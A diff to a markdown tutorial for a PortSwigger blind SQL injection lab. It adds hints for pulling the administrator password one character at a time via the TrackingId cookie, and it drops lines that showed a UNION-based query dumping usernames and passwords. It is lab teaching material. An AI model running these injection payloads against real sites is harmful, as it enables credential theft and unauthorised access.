@@ -46,10 +46,11 @@ TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LE
 
 The rest of the lab I leave to you. The goal is to:
 1. First figure out the length of the administrator password
-2. Second figure out the full password. **HINT** to get the first element of a value in sql you can do `` SELECT SUBSTRING(password,1,1) ``, To get the second value you can do `` SELECT SUBSTRING(password,2,1) `` etc...
+2. Second figure out the full password. **HINT** to get the first element of a value in sql you can do `` SELECT SUBSTRING(password,1,1) ``, To get the second value you can do `` SELECT SUBSTRING(password,2,1) `` etc. The password contains only lowercase, alphanumeric characters.
 
 The lab can be solved using Burpsuite intruder, but this throttled to the extend that it will take hours to bruteforce the password, instead create a python script!
-We can send GET request with python using the requests library
+We can send GET request with python using the requests library. 
+You need to be logged in to access the portswigger lab so dont forget to set the session cookie:
 
 ``` python
 import requests
@@ -62,22 +63,16 @@ response = requests.request("get","https://example.com/" , cookies=cookies)
 print(str(response.content))
 ```
 
-You need to be logged in to access the portswigger lab so dont forget to set the session cookie.
+<details>
+  <summary>Hint 1</summary>
+ To check if the first letter of the administrator password is an 'a', append the following to the TrackerId cookie : 
+          ``` ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a  ```
+</details>
 
+<details>
+  <summary>Hint 2</summary>
 
-``` sql
-SELECT a, b FROM table1 UNION SELECT c, d FROM table2
-```
-
-``` 
-$sqlQuery = "SELECT a, b FROM products WHERE categories = + '" + $category + "'
-```
-
-``` sql
-UNION SELECT username, password FROM users--'
-```
-
-``` sql
-SELECT a, b FROM products WHERE categories = '' UNION SELECT username, password FROM users--'
-```
-
+  ```
+  long console output here
+  ```
+</details>
